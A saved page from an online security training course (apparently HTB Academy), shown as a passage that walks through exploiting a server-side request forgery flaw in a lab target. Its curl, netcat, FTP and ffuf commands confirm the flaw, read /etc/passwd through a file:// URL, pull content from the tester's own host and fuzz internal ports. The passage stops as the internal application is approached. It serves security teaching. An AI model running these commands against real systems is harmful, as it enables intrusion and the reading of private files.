@@ -1,0 +1,1792 @@
+<!DOCTYPE html>
+<!-- saved from url=(0054)https://academy.hackthebox.com/module/145/section/1298 -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+<title>Server-side Attacks</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta content="Premium Multipurpose Admin &amp; Dashboard Template" name="description">
+<meta content="Themesbrand" name="author">
+<link rel="shortcut icon" href="https://academy.hackthebox.com/images/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://academy.hackthebox.com/images/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://academy.hackthebox.com/images/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://academy.hackthebox.com/images/apple-touch-icon.png">
+<link rel="mask-icon" href="https://academy.hackthebox.com/images/safari-pinned-tab.svg">
+<link href="./Server-side Attacks5_files/bootstrap-dark.css" id="bootstrap-style" rel="stylesheet" data-style="dark" type="text/css">
+<link href="./Server-side Attacks5_files/icons.css" rel="stylesheet" type="text/css">
+<link href="./Server-side Attacks5_files/app-dark.css" id="app-style" rel="stylesheet" data-style="dark" type="text/css">
+<link href="./Server-side Attacks5_files/prism.css" id="app-style" rel="stylesheet" data-style="dark" type="text/css">
+<link href="./Server-side Attacks5_files/toastr.min.css" rel="stylesheet" type="text/css">
+<link rel="stylesheet" href="./Server-side Attacks5_files/ryt3opf.css">
+<script type="text/javascript" async="" src="./Server-side Attacks5_files/awwxrc0h"></script><script type="text/javascript" async="" src="./Server-side Attacks5_files/uwt.js.download"></script><script type="text/javascript" async="" src="./Server-side Attacks5_files/insight.min.js.download"></script><script src="./Server-side Attacks5_files/346791856678772" async=""></script><script type="text/javascript" async="" src="./Server-side Attacks5_files/fbevents.js.download"></script><script type="text/javascript" async="" src="./Server-side Attacks5_files/analytics.js.download"></script><script type="text/javascript" src="./Server-side Attacks5_files/commons.54701049fd6fb8497e9e.js.gz" async="" status="loaded"></script><script type="text/javascript" src="./Server-side Attacks5_files/intercom.dynamic.js.gz" async="" status="loaded"></script><script type="text/javascript" src="./Server-side Attacks5_files/twitter-ads.dynamic.js.gz" async="" status="loaded"></script><script type="text/javascript" src="./Server-side Attacks5_files/linkedin-insight-tag.dynamic.js.gz" async="" status="loaded"></script><script type="text/javascript" src="./Server-side Attacks5_files/facebook-pixel.dynamic.js.gz" async="" status="loaded"></script><script type="text/javascript" src="./Server-side Attacks5_files/google-analytics.dynamic.js.gz" async="" status="loaded"></script><script type="text/javascript" async="" src="./Server-side Attacks5_files/recaptcha__en.js.download" crossorigin="anonymous" integrity="sha384-TE9Ls1LqNaomGaFdDlxBJIkg+bFnKWbASEx9XrnnCV1SiORfW/qiKK2lsAbkVeBa"></script><script type="text/javascript" async="" src="./Server-side Attacks5_files/analytics.min.js.download"></script><script>
+        !function(){var analytics=window.analytics=window.analytics||[];if(!analytics.initialize)if(analytics.invoked)window.console&&console.error&&console.error("Segment snippet included twice.");else{analytics.invoked=!0;analytics.methods=["trackSubmit","trackClick","trackLink","trackForm","pageview","identify","reset","group","track","ready","alias","debug","page","once","off","on","addSourceMiddleware","addIntegrationMiddleware","setAnonymousId","addDestinationMiddleware"];analytics.factory=function(e){return function(){var t=Array.prototype.slice.call(arguments);t.unshift(e);analytics.push(t);return analytics}};for(var e=0;e<analytics.methods.length;e++){var key=analytics.methods[e];analytics[key]=analytics.factory(key)}analytics.load=function(key,e){var t=document.createElement("script");t.type="text/javascript";t.async=!0;t.src="https://cdn.segment.com/analytics.js/v1/" + key + "/analytics.min.js";var n=document.getElementsByTagName("script")[0];n.parentNode.insertBefore(t,n);analytics._loadOptions=e};analytics._writeKey="eLzeD0QoARKZ42pc8AGEUYpcFLpYkf0I";analytics.SNIPPET_VERSION="4.13.2";
+                analytics.load("eLzeD0QoARKZ42pc8AGEUYpcFLpYkf0I");
+                                                        properties = {"platform":"Academy","platform_version":"V1","module_id":145,"module_name":"Server-side Attacks","module_difficulty":"Medium","section_id":1298,"section_title":"SSRF Exploitation Example"};
+                                                analytics.page(
+                    "Module",
+                    properties
+                );
+                                            }
+        }();
+    </script>
+<style>
+    .website-screenshot-url {
+        height: 22px;
+        cursor: text;
+        padding-left: 10px;
+    }
+</style>
+<script src="./Server-side Attacks5_files/api.js.download"></script>
+</head>
+<body data-layout="detached" data-topbar="colored">
+<div class="container-fluid">
+<div id="layout-wrapper">
+<header id="page-topbar">
+<div class="navbar-header">
+<div class="container-fluid">
+<div class="float-right">
+<div class="dropdown d-none d-lg-inline-block ml-1">
+<a href="https://academy.hackthebox.com/billing">
+<button type="button" class="btn btn-extra-light">
+<i class="fad fa-cube text-success mt-1 mr-2"></i>&nbsp;Purchase Cubes
+</button>
+</a>
+</div>
+<div class="dropdown d-none d-lg-inline-block ml-1">
+<button type="button" class="btn header-item noti-icon waves-effect" data-toggle="fullscreen">
+<i class="mdi mdi-fullscreen"></i>
+</button>
+</div>
+<div class="dropdown d-inline-block">
+<button type="button" class="btn header-item waves-effect" id="page-header-user-dropdown" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+<img class="rounded-circle header-profile-user" src="./Server-side Attacks5_files/1782606024b767354a8c9d75e1a6323a" alt="Header Avatar">
+<span class="d-none d-xl-inline-block ml-1">Tommy034</span>
+<i class="mdi mdi-chevron-down d-none d-xl-inline-block"></i>
+</button>
+<div class="dropdown-menu dropdown-menu-right">
+<a class="dropdown-item" href="https://academy.hackthebox.com/billing"><i class="bx bx-wallet font-size-16 align-middle mr-1"></i> Billing</a>
+<a class="dropdown-item d-block" href="https://academy.hackthebox.com/settings"><i class="bx bx-wrench font-size-16 align-middle mr-1"></i> Settings</a>
+<a class="dropdown-item d-block" href="https://academy.hackthebox.com/vpn"><i class="bx bx-server font-size-16 align-middle mr-1"></i> Vpn Settings</a>
+<div class="dropdown-divider"></div>
+<form method="POST" action="https://academy.hackthebox.com/logout"> <input type="hidden" name="_token" value="OEgK0JdzOZwGIHHODUXYrzCqZr0uFSlpTj7r9g5E"> <a onclick="$(this).closest(&#39;form&#39;).submit()" class="dropdown-item text-danger" href="https://academy.hackthebox.com/module/145/section/1298#"><i class="bx bx-power-off font-size-16 align-middle mr-1 text-danger"></i> Logout</a>
+</form>
+</div>
+</div>
+</div>
+<div class="d-flex align-items-center">
+<div class="navbar-brand-box">
+<a href="https://academy.hackthebox.com/dashboard" class="logo">
+<span class="logo-sm">
+<img src="./Server-side Attacks5_files/logo.svg" alt="" height="30">
+</span>
+<span class="logo-lg">
+<img src="./Server-side Attacks5_files/logo.svg" alt="" height="36">
+</span>
+</a>
+</div>
+<button type="button" class="btn btn-sm px-3 font-size-16 header-item toggle-btn waves-effect" id="vertical-menu-btn">
+<i class="fa fa-fw fa-bars"></i>
+</button>
+<div class="topnav">
+<nav class="navbar navbar-light navbar-expand-lg topnav-menu">
+<div class="collapse navbar-collapse" id="topnav-menu-content">
+<ul class="navbar-nav active">
+ <li class="nav-item">
+<a class="nav-link" href="https://academy.hackthebox.com/dashboard"><i class="mdi mdi-monitor-dashboard"></i> Dashboard</a>
+</li>
+<li class="nav-item">
+<a class="nav-link" href="https://academy.hackthebox.com/modules"><i class="mdi mdi-book-open"></i>
+Modules</a>
+</li>
+<li class="nav-item">
+<a class="nav-link" href="https://academy.hackthebox.com/paths"><i class="mdi mdi-map-marker-path"></i> Paths</a>
+</li>
+</ul>
+</div>
+</nav>
+</div>
+</div>
+</div>
+</div>
+</header>
+<div class="main-content">
+<div class="page-content">
+<div class="row">
+<div class="col-12">
+<div class="page-title-box d-flex align-items-center justify-content-between">
+<h4 class="page-title mb-0 font-size-18 letter-spacing-1">Server-side Attacks &nbsp;<i style="cursor:pointer;" data-module-id="145" data-toggle="tooltip" data-title="Toggle To-Do" class="favouriteBtn  fa  fa-heart text-danger" data-original-title="" title=""></i></h4>
+<div class="page-title-right">
+<ol class="breadcrumb m-0">
+<li class="breadcrumb-item"><a href="javascript: void(0);">Page 6</a></li>
+<li class="breadcrumb-item active">SSRF Exploitation Example</li>
+</ol>
+</div>
+</div>
+</div>
+</div>
+<div class="row justify-content-xl-center">
+<div class="col-md-12 col-xl-9 col-xxl-7">
+<div class="training-module">
+<h1>SSRF Exploitation Example</h1>
+<hr>
+<p>Let's first exploit an internet-facing web application (the target can be spawned at the bottom of this section) and then work to gain remote code execution on an internal host by chaining multiple SSRF vulnerabilities. The attack flow will be as follows:</p>
+<div class="table-responsive"><table class="table table-striped text-left">
+<thead>
+<tr>
+<th><code>[PENTESTER]</code></th>
+<th><code>🠖</code></th>
+<th><code>[EXERCISE-TARGET]--[SSRF]</code></th>
+<th><code>🠖</code></th>
+<th><code>[INTERNAL-WEBSERVER]--[SSRF]</code></th>
+<th><code>🠖</code></th>
+<th><code>[LOCALHOST WEBAPP]</code></th>
+<th><code>🠖</code></th>
+<th><code>[RCE]</code></th>
+</tr>
+</thead>
+</table></div>
+<p>Navigate to the end of this section and click on <code>Click here to spawn the target system!</code>, then use the provided Pwnbox or a local VM with the supplied VPN key to follow along.</p>
+<p>Basic reconnaissance against the host shows there are only two open ports.</p>
+<h4>Nmap - Discovering Open Ports</h4>
+<div class="window_container"><div class="window_content">
+                <div class="window_top">
+                    <span class="window_dot bg-danger"></span>
+                    <span class="window_dot bg-warning"></span>
+                    <span class="window_dot bg-success"></span>
+                    <span class="window_title">Nmap - Discovering Open Ports</span>
+                </div>
+            <pre class=" language-shell-session" style="line-height: 0px;"><code class=" language-shell-session"><span class="token output"><span class="text-gray">Tommy034@htb</span><span class="text-success">[/htb]</span></span><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash">nmap -sT -T5 --min-rate<span class="token operator">=</span><span class="token number">10000</span> -p- </span></span><span class="token output">&lt;TARGET IP&gt;
+
+Nmap scan report for &lt;TARGET IP&gt;
+Host is up (0.00047s latency).
+Not shown: 65532 filtered ports
+PORT    STATE  SERVICE
+22/tcp  open   ssh
+80/tcp  open   http
+8080/tcp open  http-proxy
+
+Nmap done: 1 IP address (1 host up) scanned in 13.25 seconds
+</span></code></pre></div></div>
+<p>Let's issue a cURLrequest to the target server using the parameters <code>-i</code> to show the protocol response headers and <code>-s</code> to use the silent mode.</p>
+<h4>Curl - Interacting with the Target</h4>
+<div class="window_container"><div class="window_content">
+                <div class="window_top">
+                    <span class="window_dot bg-danger"></span>
+                    <span class="window_dot bg-warning"></span>
+                    <span class="window_dot bg-success"></span>
+                    <span class="window_title">Curl - Interacting with the Target</span>
+                </div>
+            <pre class=" language-shell-session" style="line-height: 0px;"><code class=" language-shell-session"><span class="token output"><span class="text-gray">Tommy034@htb</span><span class="text-success">[/htb]</span></span><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">curl</span> -i -s http://</span></span><span class="token output">&lt;TARGET IP&gt;
+
+HTTP/1.0 302 FOUND
+Content-Type: text/html; charset=utf-8
+Content-Length: 242
+Location: http://&lt;TARGET IP&gt;/load?q=index.html
+Server: Werkzeug/2.0.2 Python
+Date: Mon, 18 Oct 2021 09:01:02 GMT
+
+&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"&gt;
+&lt;title&gt;Redirecting...&lt;/title&gt;
+&lt;h1&gt;Redirecting...&lt;/h1&gt;
+&lt;p&gt;You should be redirected automatically to target URL: &lt;a href="/load?q=index.html"&gt;/load?q=index.html&lt;/a&gt;. If not click the link.
+</span></code></pre></div></div>
+<p>We can see the request redirected to <code>/load?q=index.html</code>, meaning the <code>q</code> parameter fetches the resource <code>index.html</code>. Let us follow the redirect to see if we can gather any additional information.</p>
+<div class="window_container"><div class="window_content">
+                <div class="window_top">
+                    <span class="window_dot bg-danger"></span>
+                    <span class="window_dot bg-warning"></span>
+                    <span class="window_dot bg-success"></span>
+                    <span class="window_title">Curl - Interacting with the Target</span>
+                </div>
+            <pre class=" language-shell-session" style="line-height: 0px;"><code class=" language-shell-session">
+<span class="token output"><span class="text-gray">Tommy034@htb</span><span class="text-success">[/htb]</span></span><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">curl</span> -i -s -L http://</span></span><span class="token output">&lt;TARGET IP&gt;
+
+HTTP/1.0 302 FOUND
+Content-Type: text/html; charset=utf-8
+Content-Length: 242
+Location: http://&lt;TARGET IP&gt;/load?q=index.html
+Server: Werkzeug/2.0.2 Python/3.8.12
+Date: Mon, 18 Oct 2021 10:20:27 GMT
+
+HTTP/1.0 200 OK
+Content-Type: text/html; charset=utf-8
+Content-Length: 153
+Server: Werkzeug/2.0.2 Python/3.8.12
+Date: Mon, 18 Oct 2021 10:20:27 GMT
+
+&lt;html&gt;
+&lt;!-- ubuntu-web.lalaguna.local &amp; internal.app.local load resources via q parameter --&gt;
+&lt;body&gt;
+&lt;h1&gt;Bad App&lt;/h1&gt;
+&lt;a&gt;Hello World!&lt;/a&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</span></code></pre></div></div>
+<p>The spawned target is <code>ubuntu-web.lalaguna.local</code>, and <code>internal.app.local</code> is an application on the internal network (inaccessible from our current position).</p>
+<p>The next step is to confirm if the <code>q</code> parameter is vulnerable to SSRF. If it is, we may be able to reach the internal.app.local web application by leveraging the SSRF vulnerability. We say "may" because a trust relationship likely exists for <code>ubuntu-web</code> to be able to reach and interact with <code>internal.app.local</code>. This type of relationship can be something as simple as a firewall rule (or even a lack of any firewall rule).</p>
+<p>In one terminal, let's use Netcat to listen on port 8080, as follows.</p>
+<h4>Netcat Listener</h4>
+<div class="window_container"><div class="window_content">
+                <div class="window_top">
+                    <span class="window_dot bg-danger"></span>
+                    <span class="window_dot bg-warning"></span>
+                    <span class="window_dot bg-success"></span>
+                    <span class="window_title">Netcat Listener</span>
+                </div>
+            <pre class=" language-shell-session" style="line-height: 0px;"><code class=" language-shell-session"><span class="token output"><span class="text-gray">Tommy034@htb</span><span class="text-success">[/htb]</span></span><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">nc</span> -nvlp <span class="token number">8080</span></span></span>
+
+<span class="token output">listening on [any] 8080 ...
+</span></code></pre></div></div>
+<p>Now, let us issue a request to the target web application with <code>http://&lt;VPN/TUN Adapter IP&gt;</code> instead of <code>index.html</code> in another terminal, as follows. <code>&lt;VPN/TUN Adapter IP&gt;</code> will either be the TUN adapter IP of Pwnbox or the TUN adapter IP of the local VM you may be using (after connecting with the supplied VPN key).</p>
+<h4>Curl - Testing for SSRF</h4>
+<div class="window_container"><div class="window_content">
+                <div class="window_top">
+                    <span class="window_dot bg-danger"></span>
+                    <span class="window_dot bg-warning"></span>
+                    <span class="window_dot bg-success"></span>
+                    <span class="window_title">Curl - Testing for SSRF</span>
+                </div>
+            <pre class=" language-shell-session" style="line-height: 0px;"><code class=" language-shell-session"><span class="token output"><span class="text-gray">Tommy034@htb</span><span class="text-success">[/htb]</span></span><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">curl</span> -i -s <span class="token string">"http://&lt;TARGET IP&gt;/load?q=http://&lt;VPN/TUN Adapter IP&gt;:8080"</span></span></span>
+
+<span class="token output">HTTP/1.0 200 OK
+Content-Type: text/html; charset=utf-8
+Content-Length: 0
+Server: Werkzeug/2.0.2 Python/3.8.12
+Date: Mon, 18 Oct 2021 12:07:10 GMT
+</span></code></pre></div></div>
+<p>We will receive the following into our Netcat listener confirming the SSRF vulnerability via a request issued by the target server using <a href="https://docs.python.org/3.8/library/urllib.html" target="_blank" rel="noopener nofollow">Python-urllib</a>:</p>
+<h4>Netcat Listener - Confirming SSRF</h4>
+<div class="window_container"><div class="window_content">
+                <div class="window_top">
+                    <span class="window_dot bg-danger"></span>
+                    <span class="window_dot bg-warning"></span>
+                    <span class="window_dot bg-success"></span>
+                    <span class="window_title">Netcat Listener - Confirming SSRF</span>
+                </div>
+            <pre class=" language-shell-session" style="line-height: 0px;"><code class=" language-shell-session"><span class="token output">Connection received on &lt;TARGET IP&gt; 49852
+GET / HTTP/1.1
+Accept-Encoding: identity
+Host: &lt;VPN/TUN Adapter IP&gt;:8080
+User-Agent: Python-urllib/3.8
+Connection: close
+</span></code></pre></div></div>
+<p>Reading the <a href="https://docs.python.org/3.8/library/urllib.html" target="_blank" rel="noopener nofollow">Python-urllib</a> documentation, we can see it supports <code>file</code>, <code>http</code> and <code>ftp</code> schemas. So, apart from issuing HTTP requests to other services on behalf of the target application, we can also read local files via the <code>file</code> schema and remote files using <code>ftp</code>.</p>
+<p>We can test this functionality through the steps below:</p>
+<ol>
+<li>Create a file called index.html</li>
+</ol>
+<div class="window_container"><div class="window_content"><div class="window_top">Code: <span class="text-success">html</span></div><pre class=" language-html"><code class=" language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span><span class="token punctuation">&gt;</span></span>SSRF<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span>
+</code></pre></div></div>
+<ol start="2">
+<li>Inside the directory where index.html is located, start an HTTP server using the following command</li>
+</ol>
+<h4>Start Python HTTP Server</h4>
+<div class="window_container"><div class="window_content">
+                <div class="window_top">
+                    <span class="window_dot bg-danger"></span>
+                    <span class="window_dot bg-warning"></span>
+                    <span class="window_dot bg-success"></span>
+                    <span class="window_title">Start Python HTTP Server</span>
+                </div>
+            <pre class=" language-shell-session" style="line-height: 0px;"><code class=" language-shell-session"><span class="token output"><span class="text-gray">Tommy034@htb</span><span class="text-success">[/htb]</span></span><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash">python3 -m http.server <span class="token number">9090</span></span></span>
+</code></pre></div></div>
+<ol start="3">
+<li>Inside the directory where index.html is located, start an FTP Server via the following command</li>
+</ol>
+<h4>Start FTP Server</h4>
+<div class="window_container"><div class="window_content">
+                <div class="window_top">
+                    <span class="window_dot bg-danger"></span>
+                    <span class="window_dot bg-warning"></span>
+                    <span class="window_dot bg-success"></span>
+                    <span class="window_title">Start FTP Server</span>
+                </div>
+            <pre class=" language-shell-session" style="line-height: 0px;"><code class=" language-shell-session"><span class="token output"><span class="text-gray">Tommy034@htb</span><span class="text-success">[/htb]</span></span><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">sudo</span> pip3 <span class="token function">install</span> twisted</span></span>
+<span class="token output"><span class="text-gray">Tommy034@htb</span><span class="text-success">[/htb]</span></span><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">sudo</span> python3 -m twisted <span class="token function">ftp</span> -p <span class="token number">21</span> -r <span class="token builtin class-name">.</span></span></span>
+</code></pre></div></div>
+<ol start="4">
+<li>Retrieve index.html through the target application using the <code>ftp</code> schema, as follows</li>
+</ol>
+<h4>Retrieving a remote file through the target application - FTP Schema</h4>
+<div class="window_container"><div class="window_content">
+                <div class="window_top">
+                    <span class="window_dot bg-danger"></span>
+                    <span class="window_dot bg-warning"></span>
+                    <span class="window_dot bg-success"></span>
+                    <span class="window_title">Retrieving a remote file through the target application - FTP Schema</span>
+                </div>
+            <pre class=" language-shell-session" style="line-height: 0px;"><code class=" language-shell-session"><span class="token output"><span class="text-gray">Tommy034@htb</span><span class="text-success">[/htb]</span></span><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">curl</span> -i -s <span class="token string">"http://&lt;TARGET IP&gt;/load?q=ftp://&lt;VPN/TUN Adapter IP&gt;/index.html"</span></span></span>
+
+<span class="token output">HTTP/1.0 200 OK
+Content-Type: text/html; charset=utf-8
+Content-Length: 41
+Server: Werkzeug/2.0.2 Python/3.8.12
+Date: Tue, 19 Oct 2021 11:21:09 GMT
+
+&lt;html&gt;
+&lt;/body&gt;
+&lt;a&gt;SSRF&lt;/a&gt;
+&lt;body&gt;
+&lt;html&gt;
+</span></code></pre></div></div>
+<ol start="5">
+<li>Retrieve index.html through the target application using the <code>http</code> schema, as follows</li>
+</ol>
+<h4>Retrieving a remote file through the target application - HTTP Schema</h4>
+<div class="window_container"><div class="window_content">
+                <div class="window_top">
+                    <span class="window_dot bg-danger"></span>
+                    <span class="window_dot bg-warning"></span>
+                    <span class="window_dot bg-success"></span>
+                    <span class="window_title">Retrieving a remote file through the target application - HTTP Schema</span>
+                </div>
+            <pre class=" language-shell-session" style="line-height: 0px;"><code class=" language-shell-session"><span class="token output"><span class="text-gray">Tommy034@htb</span><span class="text-success">[/htb]</span></span><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">curl</span> -i -s <span class="token string">"http://&lt;TARGET IP&gt;/load?q=http://&lt;VPN/TUN Adapter IP&gt;:9090/index.html"</span></span></span>
+
+<span class="token output">HTTP/1.0 200 OK
+Content-Type: text/html; charset=utf-8
+Content-Length: 41
+Server: Werkzeug/2.0.2 Python/3.8.12
+Date: Tue, 19 Oct 2021 11:26:18 GMT
+
+&lt;html&gt;
+&lt;/body&gt;
+&lt;a&gt;SSRF&lt;/a&gt;
+&lt;body&gt;
+&lt;html&gt;
+</span></code></pre></div></div>
+<ol start="6">
+<li>Retrieve a local file using the file schema, as follows</li>
+</ol>
+<h4>Retrieving a local file through the target application - File Schema</h4>
+<div class="window_container"><div class="window_content">
+                <div class="window_top">
+                    <span class="window_dot bg-danger"></span>
+                    <span class="window_dot bg-warning"></span>
+                    <span class="window_dot bg-success"></span>
+                    <span class="window_title">Retrieving a local file through the target application - File Schema</span>
+                </div>
+            <pre class=" language-shell-session" style="line-height: 0px;"><code class=" language-shell-session"><span class="token output"><span class="text-gray">Tommy034@htb</span><span class="text-success">[/htb]</span></span><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">curl</span> -i -s <span class="token string">"http://&lt;TARGET IP&gt;/load?q=file:///etc/passwd"</span> </span></span>
+
+<span class="token output">HTTP/1.0 200 OK
+Content-Type: text/html; charset=utf-8
+Content-Length: 926
+Server: Werkzeug/2.0.2 Python/3.8.12
+Date: Tue, 19 Oct 2021 11:27:17 GMT
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+</span></code></pre></div></div>
+<p>Bear in mind that fetching remote HTML files can lead to Reflected XSS.</p>
+<p>Remember, we only have two open ports on the target server. However, there is a possibility of internal applications existing and listening only on localhost. We can use a tool such as ffuf to enumerate these web applications by performing the following steps:</p>
+<ol>
+<li>Generate a wordlist containing all possible ports.</li>
+</ol>
+<h4>Generate a Wordlist</h4>
+<div class="window_container"><div class="window_content">
+                <div class="window_top">
+                    <span class="window_dot bg-danger"></span>
+                    <span class="window_dot bg-warning"></span>
+                    <span class="window_dot bg-success"></span>
+                    <span class="window_title">Generate a Wordlist</span>
+                </div>
+            <pre class=" language-shell-session" style="line-height: 0px;"><code class=" language-shell-session"><span class="token output"><span class="text-gray">Tommy034@htb</span><span class="text-success">[/htb]</span></span><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token keyword">for</span> <span class="token for-or-select variable">port</span> <span class="token keyword">in</span> <span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">..</span><span class="token number">65535</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">do</span> <span class="token builtin class-name">echo</span> <span class="token variable">$port</span> <span class="token operator">&gt;&gt;</span> ports.txt<span class="token punctuation">;</span><span class="token keyword">done</span></span></span>
+</code></pre></div></div>
+<ol start="2">
+<li>Issue a cURL request to a random port to get the response size of a request for a non-existent service.</li>
+</ol>
+<h4>Curl - Interacting with the Target</h4>
+<div class="window_container"><div class="window_content">
+                <div class="window_top">
+                    <span class="window_dot bg-danger"></span>
+                    <span class="window_dot bg-warning"></span>
+                    <span class="window_dot bg-success"></span>
+                    <span class="window_title">Curl - Interacting with the Target</span>
+                </div>
+            <pre class=" language-shell-session" style="line-height: 0px;"><code class=" language-shell-session"><span class="token output"><span class="text-gray">Tommy034@htb</span><span class="text-success">[/htb]</span></span><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">curl</span> -i -s <span class="token string">"http://&lt;TARGET IP&gt;/load?q=http://127.0.0.1:1"</span></span></span>
+
+<span class="token output">HTTP/1.0 200 OK
+Content-Type: text/html; charset=utf-8
+Content-Length: 30
+Server: Werkzeug/2.0.2 Python/3.8.12
+Date: Tue, 19 Oct 2021 11:36:25 GMT
+
+[Errno 111] Connection refused
+</span></code></pre></div></div>
+<ol start="3">
+<li>Use ffuf with the wordlist and discard the responses which have the size we previously identified.</li>
+</ol>
+<h4>Port Fuzzing</h4>
+<div class="window_container"><div class="window_content">
+                <div class="window_top">
+                    <span class="window_dot bg-danger"></span>
+                    <span class="window_dot bg-warning"></span>
+                    <span class="window_dot bg-success"></span>
+                    <span class="window_title">Port Fuzzing</span>
+                </div>
+            <pre class=" language-shell-session" style="line-height: 0px;"><code class=" language-shell-session"><span class="token output"><span class="text-gray">Tommy034@htb</span><span class="text-success">[/htb]</span></span><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash">ffuf -w ./ports.txt:PORT -u <span class="token string">"http://&lt;TARGET IP&gt;/load?q=http://127.0.0.1:PORT"</span> -fs <span class="token number">30</span></span></span>
+
+<span class="token output">        /'___\  /'___\           /'___\
+       /\ \__/ /\ \__/  __  __  /\ \__/
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+         \ \_\   \ \_\  \ \____/  \ \_\
+          \/_/    \/_/   \/___/    \/_/
+
+       v1.3.1 Kali Exclusive &lt;3
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://&lt;TARGET IP&gt;/load?q=http://127.0.0.1:PORT
+ :: Wordlist         : PORT: ./ports.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405
+ :: Filter           : Response size: 30
+________________________________________________
+
+80                      [Status: 200, Size: 153, Words: 11, Lines: 8]
+5000                    [Status: 200, Size: 64, Words: 3, Lines: 1]
+:: Progress: [65535/65535] :: Job [1/1] :: 577 req/sec :: Duration: [0:02:00] :: Errors: 0 ::
+</span></code></pre></div></div>
+<p>We have received a valid response for port <code>5000</code>. Let us check it as follows.</p>
+<h4>cURL - Interacting with the Target</h4>
+<div class="window_container"><div class="window_content">
+                <div class="window_top">
+                    <span class="window_dot bg-danger"></span>
+                    <span class="window_dot bg-warning"></span>
+                    <span class="window_dot bg-success"></span>
+                    <span class="window_title">cURL - Interacting with the Target</span>
+                </div>
+            <pre class=" language-shell-session" style="line-height: 0px;"><code class=" language-shell-session"><span class="token output"><span class="text-gray">Tommy034@htb</span><span class="text-success">[/htb]</span></span><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">curl</span> -i -s <span class="token string">"http://&lt;TARGET IP&gt;/load?q=http://127.0.0.1:5000"</span></span></span>
+
+<span class="token output">HTTP/1.0 200 OK
+Content-Type: text/html; charset=utf-8
+Content-Length: 64
+Server: Werkzeug/2.0.2 Python/3.8.12
+Date: Tue, 19 Oct 2021 11:47:16 GMT
+
+&lt;html&gt;&lt;body&gt;&lt;h1&gt;Hey!&lt;/h1&gt;&lt;a&gt;Some internal app!&lt;/a&gt;&lt;/body&gt;&lt;/html&gt;
+</span></code></pre></div></div>
+<p>Up to this point, we have learned how to reach internal applications and use different schemas to load local files through SSRF. Armed with this knowledge, let us try attacking the <code>internal.app.local</code> web application, again through SSRF. Our ultimate goal is to achieve remote code execution on an internal host.</p>
+<p>First, we issue a simple cURL request to the internal application we discovered previously. Remember the information we uncovered that both applications load resources in the same way (via the <code>q</code> parameter).</p>
+<h4>cURL - Interacting with the Target</h4>
+<div class="window_container"><div class="window_content">
+                <div class="window_top">
+                    <span class="window_dot bg-danger"></span>
+                    <span class="window_dot bg-warning"></span>
+                    <span class="window_dot bg-success"></span>
+                    <span class="window_title">cURL - Interacting with the Target</span>
+                </div>
